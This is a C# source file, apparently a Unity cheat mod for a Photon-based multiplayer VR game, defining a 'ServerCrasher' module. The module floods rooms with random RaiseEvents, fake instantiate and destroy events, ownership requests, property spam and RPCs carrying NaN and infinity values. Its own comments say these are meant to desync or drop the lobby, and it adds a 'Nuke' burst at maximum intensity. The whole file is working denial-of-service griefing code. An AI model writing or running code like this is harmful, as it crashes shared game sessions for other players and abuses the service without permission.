using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using System;
using System.Collections.Generic;
using UnityEngine;
using Vaga.Classes;
using Random = UnityEngine.Random;

namespace Vaga.Mods
{
    /// <summary>
    /// ServerCrasher — room / network stress module for Photon rooms.
    /// Floods the room (and optionally the master) with high-volume RaiseEvents,
    /// ownership thrash, instantiate/destroy spam, property spam, and oversized
    /// payloads intended to desync or drop the lobby.
    /// Client-side only. Severity is tunable.
    /// </summary>
    internal static class ServerCrasher
    {
        public static bool Enabled;

        // Intensity
        public static int EventsPerTick = 24;
        public static float TickRate = 0.03f;          // seconds between bursts
        public static int PayloadSize = 512;           // bytes of padding in payloads
        public static bool TargetMasterOnly = false;   // if true, focus master client
        public static bool BroadcastAll = true;        // ReceiverGroup.All / Others

        // Vectors
        public static bool UseRaiseEventFlood = true;
        public static bool UseOwnershipThrash = true;
        public static bool UseInstantiateSpam = true;
        public static bool UseDestroySpam = true;
        public static bool UseRoomPropsSpam = true;
        public static bool UsePlayerPropsSpam = true;
        public static bool UseRPCFlood = true;
        public static bool UseInterestGroupSpam = false;

        private static float _nextTick;
        private static readonly byte[] EventCodes =
        {
            200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210,
            211, 212, 213, 214, 215, 220, 230, 240, 250
        };

        private static readonly string[] RpcNames =
        {
            "RPC_InitializeNoobMaterial",
            "RPC_UpdateCosmetics",
            "RPC_PlayHandTap",
            "RPC_Drop",
            "RPC_TagPlayer",
            "RPC_SetSliderJoint",
            "RPC_UpdateColor"
        };

        public static void Update()
        {
            if (!Enabled || !PhotonNetwork.InRoom) return;
            if (Time.time < _nextTick) return;
            _nextTick = Time.time + TickRate;

            for (int i = 0; i < EventsPerTick; i++)
            {
                if (UseRaiseEventFlood) RaiseEventFlood();
                if (UseOwnershipThrash) OwnershipThrash();
                if (UseInstantiateSpam) InstantiateSpam();
                if (UseDestroySpam) DestroySpam();
                if (UseRoomPropsSpam) RoomPropsSpam();
                if (UsePlayerPropsSpam) PlayerPropsSpam();
                if (UseRPCFlood) RPCFlood();
                if (UseInterestGroupSpam) InterestGroupSpam();
            }
        }

        // ── RaiseEvent flood ─────────────────────────────────────────────

        private static void RaiseEventFlood()
        {
            try
            {
                byte code = EventCodes[Random.Range(0, EventCodes.Length)];
                object payload = BuildPayload();

                RaiseEventOptions opts = new RaiseEventOptions
                {
                    Receivers = BroadcastAll ? ReceiverGroup.All : ReceiverGroup.Others,
                    CachingOption = EventCaching.DoNotCache
                };

                if (TargetMasterOnly && PhotonNetwork.MasterClient != null)
                {
                    opts.TargetActors = new[] { PhotonNetwork.MasterClient.ActorNumber };
                    opts.Receivers = ReceiverGroup.Others;
                }

                SendOptions send = new SendOptions
                {
                    Reliability = true,
                    Encrypt = false,
                    Channel = (byte)Random.Range(0, 4)
                };

                PhotonNetwork.RaiseEvent(code, payload, opts, send);
            }
            catch { }
        }

        private static object BuildPayload()
        {
            // Mix of types known to stress serializers / handlers
            byte[] pad = new byte[Mathf.Clamp(PayloadSize, 16, 4096)];
            Random.Range(0, 255); // seed-ish
            for (int i = 0; i < pad.Length; i++) pad[i] = (byte)(i & 0xFF);

            return new object[]
            {
                PhotonNetwork.LocalPlayer.ActorNumber,
                Random.Range(int.MinValue, int.MaxValue),
                float.NaN,
                float.PositiveInfinity,
                Vector3.positiveInfinity,
                Quaternion.identity,
                pad,
                "crash",
                new Dictionary<byte, object>
                {
                    { 0, pad },
                    { 1, float.NaN },
                    { 245, PhotonNetwork.LocalPlayer.ActorNumber }
                }
            };
        }

        // ── Ownership thrash ─────────────────────────────────────────────

        private static void OwnershipThrash()
        {
            try
            {
                // Thrash ownership on a few active photon views (rigs / objects)
                var views = Vaga.Mods.LeakGuard.Views();
                if (views == null || views.Length == 0) return;

                int take = Mathf.Min(4, views.Length);
                for (int i = 0; i < take; i++)
                {
                    PhotonView v = views[Random.Range(0, views.Length)];
                    if (v == null) continue;
                    v.RequestOwnership();
                    PhotonNetwork.RaiseEvent(209,
                        new object[] { v.ViewID, PhotonNetwork.LocalPlayer.ActorNumber },
                        new RaiseEventOptions { Receivers = ReceiverGroup.Others },
                        SendOptions.SendReliable);
                }
            }
            catch { }
        }

        // ── Instantiate / Destroy spam (event codes 202 / 201 style) ─────

        private static void InstantiateSpam()
        {
            try
            {
                // Event 202 is commonly associated with instantiate in Photon
                object[] data = new object[]
                {
                    "PhotonPrefabs/DestroyAfterTime", // common-ish name; may not exist
                    Vector3.zero,
                    Quaternion.identity,
                    0,
                    new int[] { Random.Range(1000, 9999) },
                    PhotonNetwork.LocalPlayer.ActorNumber,
                    PhotonNetwork.ServerTimestamp
                };

                PhotonNetwork.RaiseEvent(202, data,
                    new RaiseEventOptions { Receivers = ReceiverGroup.Others },
                    SendOptions.SendReliable);
            }
            catch { }
        }

        private static void DestroySpam()
        {
            try
            {
                // Event 201 destroy-style
                int fakeViewId = Random.Range(1000, 50000);
                PhotonNetwork.RaiseEvent(201, new object[] { fakeViewId },
                    new RaiseEventOptions { Receivers = ReceiverGroup.Others },
                    SendOptions.SendReliable);
            }
            catch { }
        }

        // ── Room / player custom properties spam ─────────────────────────

        private static void RoomPropsSpam()
        {
            try
            {
                ExitGames.Client.Photon.Hashtable props = new ExitGames.Client.Photon.Hashtable();
                for (int i = 0; i < 6; i++)
                {
                    props[$"c{Random.Range(0, 9999)}"] = Random.Range(0, int.MaxValue);
                }
                props["gameMode"] = PhotonNetwork.CurrentRoom.CustomProperties.ContainsKey("gameMode")
                    ? PhotonNetwork.CurrentRoom.CustomProperties["gameMode"]
                    : "forest";
                PhotonNetwork.CurrentRoom.SetCustomProperties(props);
            }
            catch { }
        }

        private static void PlayerPropsSpam()
        {
            try
            {
                ExitGames.Client.Photon.Hashtable props = new ExitGames.Client.Photon.Hashtable();
                for (int i = 0; i < 4; i++)
                {
                    props[$"p{Random.Range(0, 9999)}"] = Random.value;
                }
                PhotonNetwork.LocalPlayer.SetCustomProperties(props);
            }
            catch { }
        }

        // ── RPC flood on random remote views ─────────────────────────────

        private static void RPCFlood()
        {
            try
            {
                VRRig rig = RigManager.GetRandomVRRig(false);
                if (rig == null) return;
                PhotonView view = RigManager.GetPhotonViewFromVRRig(rig);
                if (view == null) return;

                string rpc = RpcNames[Random.Range(0, RpcNames.Length)];
                view.RPC(rpc, RpcTarget.Others,
                    float.NaN, Vector3.positiveInfinity, int.MaxValue, true);
            }
            catch { }
        }

        // ── Interest group thrash ────────────────────────────────────────

        private static void InterestGroupSpam()
        {
            try
            {
                byte g = (byte)Random.Range(1, 250);
                PhotonNetwork.SetInterestGroups(new byte[] { g }, new byte[] { g });
            }
            catch { }
        }

        // ── Public one-shots ─────────────────────────────────────────────

        /// <summary>Maximum intensity burst for a few seconds worth of ticks.</summary>
        public static void Nuke()
        {
            if (!PhotonNetwork.InRoom) return;
            int saved = EventsPerTick;
            float savedRate = TickRate;
            EventsPerTick = 64;
            TickRate = 0.01f;
            for (int t = 0; t < 30; t++)
            {
                for (int i = 0; i < EventsPerTick; i++)
                {
                    RaiseEventFlood();
                    OwnershipThrash();
                    InstantiateSpam();
                    DestroySpam();
                    RoomPropsSpam();
                    PlayerPropsSpam();
                    RPCFlood();
                }
            }
            EventsPerTick = saved;
            TickRate = savedRate;
        }

        public static void SoftStress()
        {
            EventsPerTick = 8;
            TickRate = 0.08f;
            PayloadSize = 128;
            UseInstantiateSpam = false;
            UseDestroySpam = false;
            UseRoomPropsSpam = false;
        }

        public static void HardStress()
        {
            EventsPerTick = 32;
            TickRate = 0.02f;
            PayloadSize = 1024;
            UseRaiseEventFlood = true;
            UseOwnershipThrash = true;
            UseInstantiateSpam = true;
            UseDestroySpam = true;
            UseRoomPropsSpam = true;
            UsePlayerPropsSpam = true;
            UseRPCFlood = true;
        }

        public static void Status()
        {
            Debug.Log($"[ServerCrasher] Enabled={Enabled} Events/tick={EventsPerTick} " +
                      $"Rate={TickRate} Payload={PayloadSize} MasterOnly={TargetMasterOnly}");
        }
    }
}
